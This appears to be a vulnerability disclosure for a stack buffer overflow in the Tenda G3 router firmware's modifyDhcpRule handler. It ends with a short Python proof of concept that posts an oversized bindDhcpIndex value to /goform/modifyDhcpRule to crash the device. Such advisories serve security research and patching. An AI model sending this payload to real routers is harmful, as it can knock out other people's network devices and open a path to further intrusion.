## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3107.html

## Affected version

G3 V15.11.0.17(9502)

## Vulnerability details

The Tenda G3 V15.11.0.17(9502) firmware has a stack overflow vulnerability in the `modifyDhcpRule` function. The `bindDhcpIndex` variable receives the `bindDhcpIndex` parameter from a POST request. However, since the user can control the input of `bindDhcpIndex `, the statement can cause a buffer overflow. The user-provided `bindDhcpIndex` can exceed the capacity of the `mibName` array, triggering this security vulnerability.

![image-20240417212710201](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417212710201.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/modifyDhcpRule"
payload = b"a"*2000

data = {
    	'bindDhcpIndex':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```

![image-20240416114043980](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240416114043980.png)
